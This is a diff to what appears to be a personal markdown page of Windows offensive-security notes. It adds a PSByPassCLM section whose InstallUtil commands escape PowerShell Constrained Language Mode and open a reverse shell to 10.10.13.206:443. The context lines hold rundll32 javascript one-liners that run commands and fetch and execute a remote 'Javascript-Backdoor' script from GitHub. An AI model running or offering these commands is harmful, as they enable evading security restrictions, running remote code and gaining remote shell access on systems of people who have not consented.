@@ -166,6 +166,7 @@ A place for me to store my notes/tricks for Windows Based Systems.
       * <a href="#-psattack">PSAttack</a>
       * <a href="#-nopowershell">NoPowerShell</a>
       * <a href="#-rundll32--bypass">runDLL32  Bypass</a>
+      * <a href="#-psbypassclm">PSByPassCLM</a>
 
 
 
@@ -2416,7 +2417,7 @@ unicorn.py Nishang.ps1
 
 
 
-#### [](#header-4) Verify is you are in constrained mode
+#### [](#header-4) Verify If You Are in Constrained Mode
 
 ```
 $ExecutionContext.SessionState.LanguageMode
@@ -2552,4 +2553,31 @@ rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20Activ
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
 
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")
+```
+
+
+
+#### [](#header-4) PSByPassCLM
+
+```powershell
+#Reference: https://github.com/padovah4ck/PSByPassCLM
+
+This technique might come in handy wherever or whenever you're stuck in a low privilege PS console
+and PowerShell Version 2 engine is not available to perform a PowerShell Downgrade Attacks.
+
+Build Binary :
+
+C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
+
+
+Usage
+
+Open Subshell in Current Console
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
+
+Open a PS Reverse Shell with Bypass Integrated
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
+
+
 ```
